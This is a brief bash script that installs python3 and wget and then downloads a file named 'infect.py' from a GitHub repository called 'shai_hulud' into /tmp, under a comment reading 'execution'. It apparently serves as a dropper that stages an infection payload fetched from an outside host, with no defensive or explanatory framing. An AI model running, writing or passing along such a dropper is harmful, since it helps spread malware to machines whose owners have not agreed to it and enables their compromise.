#!/bin/bash

#dependancies
apt-get update
apt-get install python3 -y
apt-get install wget -y

#execution
wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py 
touch /tmp/x
